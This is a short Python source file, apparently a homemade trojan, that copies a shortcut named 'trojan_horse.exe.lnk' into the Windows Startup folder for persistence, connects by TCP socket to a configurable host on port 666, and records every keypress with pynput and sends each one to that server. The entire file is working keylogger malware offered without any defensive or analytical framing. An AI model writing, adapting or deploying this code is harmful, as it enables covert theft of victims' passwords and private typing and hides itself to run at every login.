import os.path
import socket
from pynput.keyboard import Listener

def trojan():
    file = "trojan_horse.exe.lnk"
    command = "copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(file)
    os.system(command)

    HOST = 'localhost'  # ip
    PORT = 666  # check if port is free

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    def send_to_server(command):
        client.send(command.encode('utf-8'))

    def on_press(key):
        try:
            send_to_server(str(key))
        except AttributeError:
            send_to_server(key)

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    trojan()